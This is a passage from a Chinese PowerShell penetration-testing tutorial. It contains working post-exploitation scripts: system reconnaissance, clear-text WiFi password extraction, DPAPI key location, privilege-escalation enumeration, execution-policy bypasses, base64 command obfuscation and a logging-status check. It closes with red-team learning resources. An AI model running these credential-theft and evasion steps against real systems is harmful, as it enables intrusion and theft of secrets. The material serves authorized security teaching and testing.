---

## 四、高级实战案例

### 4.1 高级信息收集脚本

自动化 Windows 环境信息收集，用于渗透测试后的 reconnaissance。

```powershell
function Invoke-SystemRecon {
    <#
    .SYNOPSIS
    高级系统信息收集脚本
    #>
    param(
        [string]$OutputPath = "$env:TEMP\recon_output"
    )
    
    $result = @{}
    
    Write-Host "[*] 开始系统信息收集..." -ForegroundColor Cyan
    
    # ===== 系统基本信息 =====
    Write-Host "[+] 收集系统基本信息..." -ForegroundColor Green
    $osInfo = Get-CimInstance Win32_OperatingSystem
    $computerInfo = Get-CimInstance Win32_ComputerSystem
    $result.System = @{
        Hostname = $env:COMPUTERNAME
        OS = $osInfo.Caption
        Version = $osInfo.Version
        Build = $osInfo.BuildNumber
        Architecture = $osInfo.OSArchitecture
        Manufacturer = $computerInfo.Manufacturer
        Model = $computerInfo.Model
        TotalMemory = [math]::Round($computerInfo.TotalPhysicalMemory/1GB, 2)
        Domain = $computerInfo.Domain
        Workgroup = $computerInfo.Workgroup
    }
    
    # ===== 当前用户与权限 =====
    Write-Host "[+] 收集用户权限信息..." -ForegroundColor Green
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    $result.User = @{
        Username = $env:USERNAME
        UserDomain = $env:USERDOMAIN
        IsAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        IsSystem = ($env:USERNAME -eq "SYSTEM")
        Groups = $identity.Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value }
    }
    
    # ===== 网络信息 =====
    Write-Host "[+] 收集网络信息..." -ForegroundColor Green
    $adapters = Get-NetAdapter -Physical | Where-Object Status -eq "Up"
    $ipConfig = Get-NetIPConfiguration
    $result.Network = @{
        Adapters = $adapters | ForEach-Object { @{
            Name = $_.Name
            MAC = $_.MacAddress
            Speed = $_.LinkSpeed
        }}
        IPAddresses = $ipConfig.IPv4Address.IPAddress
        DNSServers = $ipConfig.DNSServer.ServerAddresses
        Gateway = $ipConfig.IPv4DefaultGateway.NextHop
    }
    
    # 网络连接
    $result.Network.Connections = Get-NetTCPConnection -State Listen, Established | 
        Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, 
            @{Name="PID";Expression={$_.OwningProcess}},
            @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}} |
        Group-Object LocalPort | ForEach-Object { $_.Group | Select-Object -First 1 }
    
    # ===== 进程与服务 =====
    Write-Host "[+] 收集进程与服务..." -ForegroundColor Green
    $result.Processes = Get-Process | Where-Object { $_.Path } | 
        Select-Object Name, Id, Path, 
            @{Name="Company";Expression={$_.Company}},
            @{Name="IsSigned";Expression={
                try { (Get-AuthenticodeSignature $_.Path).Status -eq "Valid" } catch { $false }
            }} | Sort-Object Name
    
    $result.Services = Get-Service | Where-Object Status -eq "Running" | 
        Select-Object Name, DisplayName, StartType, 
            @{Name="Path";Expression={(Get-CimInstance Win32_Service -Filter "Name='$($_.Name)'").PathName}} |
        Sort-Object Name
    
    # ===== 计划任务 =====
    Write-Host "[+] 收集计划任务..." -ForegroundColor Green
    $result.ScheduledTasks = Get-ScheduledTask | Where-Object State -eq "Ready" | 
        ForEach-Object {
            $action = $_.Actions | Select-Object -First 1
            [PSCustomObject]@{
                TaskName = $_.TaskName
                TaskPath = $_.TaskPath
                Execute = $action.Execute
                Arguments = $action.Arguments
                Author = $_.Author
            }
        } | Where-Object { $_.Execute -ne $null } | Select-Object -First 50
    
    # ===== 已安装软件 =====
    Write-Host "[+] 收集已安装软件..." -ForegroundColor Green
    $result.Software = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*", 
        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName } | 
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
        Sort-Object DisplayName
    
    # ===== 安全产品检测 =====
    Write-Host "[+] 检测安全产品..." -ForegroundColor Green
    $securityProducts = @()
    $antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction SilentlyContinue
    if ($antivirus) {
        $securityProducts += $antivirus | ForEach-Object { $_.displayName }
    }
    $firewall = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "FirewallProduct" -ErrorAction SilentlyContinue
    if ($firewall) {
        $securityProducts += $firewall | ForEach-Object { $_.displayName }
    }
    $result.SecurityProducts = $securityProducts
    
    # ===== 输出结果 =====
    if (!(Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    }
    
    $result | ConvertTo-Json -Depth 5 | Out-File -FilePath "$OutputPath\recon.json" -Encoding utf8
    
    Write-Host "`n[*] 收集完成，结果保存在: $OutputPath" -ForegroundColor Cyan
    return $result
}

# 使用示例
# Invoke-SystemRecon -OutputPath "C:\temp\recon"
```

### 4.2 凭证提取与哈希抓取

安全研究中常见的凭证获取技术演示（仅用于授权测试）。

```powershell
function Invoke-CredentialHarvest {
    <#
    .SYNOPSIS
    凭证收集演示（仅用于授权安全测试）
    #>
    param(
        [ValidateSet("Browser","WiFi","DPAPI","All")]
        [string]$Type = "All"
    )
    
    $creds = @{}
    
    # ===== WiFi 密码提取 =====
    if ($Type -in @("WiFi", "All")) {
        Write-Host "[+] 提取 WiFi 凭证..." -ForegroundColor Green
        $wifiProfiles = netsh wlan show profiles | Select-String "所有用户配置文件|All User Profile"
        $wifiCreds = @()
        
        foreach ($profile in $wifiProfiles) {
            $name = ($profile -split ":")[1].Trim()
            $keyContent = netsh wlan show profile name="$name" key=clear | 
                Select-String "关键内容|Key Content"
            if ($keyContent) {
                $password = ($keyContent -split ":")[1].Trim()
                $wifiCreds += [PSCustomObject]@{
                    SSID = $name
                    Password = $password
                }
            }
        }
        $creds.WiFi = $wifiCreds
    }
    
    # ===== 浏览器凭证检测提示 =====
    if ($Type -in @("Browser", "All")) {
        Write-Host "[!] 浏览器凭证需要专门工具 (如 mimikatz, lazagne)" -ForegroundColor Yellow
        Write-Host "    Chrome/Edge 使用 DPAPI 加密，需要明文密钥" -ForegroundColor Yellow
    }
    
    # ===== DPAPI 保护的数据 =====
    if ($Type -in @("DPAPI", "All")) {
        Write-Host "[+] DPAPI 主密钥文件位置:" -ForegroundColor Green
        $dpapiPath = "$env:APPDATA\Microsoft\Protect"
        if (Test-Path $dpapiPath) {
            Get-ChildItem $dpapiPath -Recurse -File | Select-Object FullName, Length
        }
    }
    
    return $creds
}

# 使用示例
# Invoke-CredentialHarvest -Type WiFi
```

### 4.3 权限提升枚举脚本

自动化检测常见的 Windows 提权向量。

```powershell
function Invoke-PrivEscCheck {
    <#
    .SYNOPSIS
    Windows 提权向量枚举（仅用于授权安全测试）
    #>
    
    $findings = @()
    
    Write-Host "[*] 开始提权向量枚举..." -ForegroundColor Cyan
    
    # ===== 1. 始终安装提升的权限 =====
    Write-Host "[+] 检查 AlwaysInstallElevated..." -ForegroundColor Green
    $aiu = Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
    $aiuLM = Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
    if ($aiu.AlwaysInstallElevated -eq 1 -and $aiuLM.AlwaysInstallElevated -eq 1) {
        $findings += @{
            Severity = "High"
            Title = "AlwaysInstallElevated 已启用"
            Detail = "MSI 安装包将以 SYSTEM 权限运行"
        }
    }
    
    # ===== 2. 可写服务目录 =====
    Write-Host "[+] 检查服务路径权限..." -ForegroundColor Green
    $services = Get-CimInstance Win32_Service | Where-Object { $_.PathName -and $_.StartMode -ne "Disabled" }
    
    foreach ($svc in $services | Select-Object -First 30) {
        $path = $svc.PathName.Split('"')[1]  # 提取路径
        if (!$path) { $path = $svc.PathName.Split(' ')[0] }
        
        if ($path -and (Test-Path $path)) {
            try {
                $acl = Get-Acl $path -ErrorAction Stop
                $access = $acl.Access | Where-Object {
                    $_.IdentityReference -match "Users|Authenticated Users|Everyone" -and
                    $_.FileSystemRights -match "Write|Modify|FullControl" -and
                    $_.AccessControlType -eq "Allow"
                }
                if ($access) {
                    $findings += @{
                        Severity = "High"
                        Title = "服务文件可写: $($svc.Name)"
                        Detail = "路径: $path - 用户可修改服务可执行文件"
                    }
                }
            } catch {}
        }
    }
    
    # ===== 3. 未引用的服务路径 =====
    Write-Host "[+] 检查未引用服务路径..." -ForegroundColor Green
    foreach ($svc in $services | Select-Object -First 30) {
        $path = $svc.PathName
        if ($path -and $path -notmatch '^"' -and $path -match ' ') {
            $findings += @{
                Severity = "Medium"
                Title = "未引用服务路径: $($svc.Name)"
                Detail = "路径: $path - 可能存在路径劫持"
            }
        }
    }
    
    # ===== 4. 计划任务权限 =====
    Write-Host "[+] 检查计划任务权限..." -ForegroundColor Green
    $tasks = Get-ScheduledTask | Where-Object { $_.Principal.RunLevel -eq "Highest" }
    foreach ($task in $tasks | Select-Object -First 20) {
        $action = $task.Actions | Select-Object -First 1
        $exePath = $action.Execute
        if ($exePath -and (Test-Path $exePath)) {
            try {
                $acl = Get-Acl $exePath -ErrorAction Stop
                $writable = $acl.Access | Where-Object {
                    $_.IdentityReference -match "Users|Authenticated Users" -and
                    $_.FileSystemRights -match "Write|Modify|FullControl"
                }
                if ($writable) {
                    $findings += @{
                        Severity = "High"
                        Title = "高权限任务文件可写: $($task.TaskName)"
                        Detail = "路径: $exePath - 以最高权限运行"
                    }
                }
            } catch {}
        }
    }
    
    # ===== 5. 注册表自动运行 =====
    Write-Host "[+] 检查自动运行项..." -ForegroundColor Green
    $autoRunPaths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    )
    
    foreach ($regPath in $autoRunPaths) {
        if (Test-Path $regPath) {
            $items = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
            foreach ($item in $items.PSObject.Properties) {
                if ($item.Value -and $item.Value -match '^[A-Z]:\\') {
                    # 检查路径是否可写
                    $exe = $item.Value.Split('"')[1]
                    if (!$exe) { $exe = $item.Value.Split(' ')[0] }
                    # 简化的检查逻辑
                }
            }
        }
    }
    
    # ===== 6. 令牌权限检查 =====
    Write-Host "[+] 检查当前令牌权限..." -ForegroundColor Green
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $privileges = $identity.Claims | Where-Object { $_.Type -match "privilege" }
    if ($privileges) {
        $findings += @{
            Severity = "Info"
            Title = "当前令牌权限"
            Detail = ($privileges.Value -join ", ")
        }
    }
    
    # ===== 输出结果 =====
    Write-Host "`n[*] 枚举完成，发现 $($findings.Count) 个潜在问题:" -ForegroundColor Cyan
    foreach ($f in $findings) {
        $color = switch ($f.Severity) {
            "High" { "Red" }
            "Medium" { "Yellow" }
            default { "White" }
        }
        Write-Host "  [$($f.Severity)] $($f.Title)" -ForegroundColor $color
        Write-Host "         $($f.Detail)"
    }
    
    return $findings
}

# 使用示例
# Invoke-PrivEscCheck
```

### 4.4 绕过执行策略与 AMSI

PowerShell 安全绕过技术演示（仅用于学习研究）。

```powershell
<#
    警告：以下内容仅用于安全研究与授权测试
    未经授权使用可能违反法律法规
#>

# ===== 1. 执行策略绕过方法 =====

# 方法1: 命令行参数
# powershell -ExecutionPolicy Bypass -File script.ps1

# 方法2: 读取文件并通过管道执行
# Get-Content .\script.ps1 | Invoke-Expression

# 方法3: 更改当前用户策略（需权限）
# Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass

# 方法4: 环境变量
# $env:PSExecutionPolicyPreference = "Bypass"

# ===== 2. AMSI 相关 =====
# 注意：AMSI 绕过技术随时可能被修复
# 合法安全测试应使用官方授权的测试环境

# 检测 AMSI 是否启用
function Test-AMSI {
    try {
        $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($amsi) {
            Write-Host "[!] AMSI 已加载" -ForegroundColor Yellow
            return $true
        }
    } catch {
        Write-Host "[+] AMSI 未检测到" -ForegroundColor Green
    }
    return $false
}

# ===== 3. 脚本混淆基础 =====

function Invoke-ObfuscationBasic {
    param([string]$Script)
    
    # 简单的字符串编码
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Script)
    $encoded = [Convert]::ToBase64String($bytes)
    
    Write-Host "Base64 编码后的命令:"
    Write-Host "powershell -EncodedCommand $encoded"
    
    return $encoded
}

# ===== 4. 约束语言模式检测 =====
function Test-ConstrainedLanguage {
    try {
        $ExecutionContext.SessionState.LanguageMode
    } catch {
        "Unknown"
    }
}

# ===== 5. 系统日志检测 =====
function Get-PowerShellLoggingStatus {
    $logging = @{}
    
    # 检查模块日志
    $moduleLogging = Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue
    $logging.ModuleLogging = if ($moduleLogging.EnableModuleLogging -eq 1) { "Enabled" } else { "Disabled" }
    
    # 检查脚本块日志
    $scriptBlock = Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
    $logging.ScriptBlockLogging = if ($scriptBlock.EnableScriptBlockLogging -eq 1) { "Enabled" } else { "Disabled" }
    
    # 检查转录
    $transcript = Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue
    $logging.Transcription = if ($transcript.EnableTranscripting -eq 1) { "Enabled" } else { "Disabled" }
    
    return $logging
}
```

---

## 五、进阶学习资源

### 5.1 PowerShell 安全资源

- **PowerShell 官方文档**：https://learn.microsoft.com/zh-cn/powershell/
- **PowerShell 安全指南**：https://learn.microsoft.com/zh-cn/powershell/scripting/learn/security
- **PowerShell 团队博客**：https://devblogs.microsoft.com/powershell/
- **PowerShell 攻击与防御**：https://attack.mitre.org/techniques/T1059/001/

### 5.2 红队与渗透测试资源

- **PowerShell Empire**：https://github.com/BC-SECURITY/Empire — PowerShell 后期利用框架
- **PowerSploit**：https://github.com/PowerShellMafia/PowerSploit — PowerShell 安全工具集
- **Nishang**：https://github.com/samratashok/nishang — 渗透测试 PowerShell 框架
- **PSAttack**：https://github.com/jaredhaight/PSAttack — PowerShell 攻击工具包

### 5.3 防御与检测资源

- **AMSI 文档**：https://learn.microsoft.com/zh-cn/windows/win32/amsi/antimalware-scan-interface-portal
- **PowerShell 日志记录**：https://learn.microsoft.com/zh-cn/powershell/scripting/learn/experimental-features
- **Sysmon**：https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon — 系统监控
- **Windows 事件日志**：https://attack.mitre.org/datasources/DS0027/

### 5.4 学习平台

- **Hack The Box**：https://www.hackthebox.com/
- **TryHackMe**：https://tryhackme.com/
- **Offensive Security Proving Grounds**：https://www.offensive-security.com/labs/
- **VulnHub**：https://www.vulnhub.com/

### 5.5 推荐书籍

- **PowerShell 实战**：《Learn PowerShell in a Month of Lunches》
- **PowerShell 高级编程**：《PowerShell in Depth》
- **红队操作**：《Red Team Development and Operations》
- **Windows 内部原理**：《Windows Internals》

### 5.6 社区与博客

- **PowerShell 画廊**：https://www.powershellgallery.com/
- **Reddit r/PowerShell**：https://www.reddit.com/r/PowerShell/
- **FreeBuf**：https://www.freebuf.com/
- **安全客**：https://www.anquanke.com/
- **先知社区**：https://xz.aliyun.com/

### 5.7 进阶学习路线

**第 1 阶段：PowerShell 精通（1-2月）**
- 高级函数与模块开发
- .NET 互操作
- CIM/WMI 管理
- 正则表达式与文本处理

**第 2 阶段：系统编程（2-3月）**
- Windows API 调用
- 反射与动态代码
- 内存操作
- Windows 内部机制

**第 3 阶段：安全工具开发（2-3月）**
- 信息收集工具
- 漏洞扫描器
- 后渗透工具
- 日志分析

**第 4 阶段：红队技术（3-6月）**
- 规避检测技术
- 横向移动
- 凭证窃取
- 持久化技术

**第 5 阶段：实战与认证（持续）**
- OSCP/CRTO 认证
- CTF 比赛
- 漏洞研究
- 工具开发与贡献
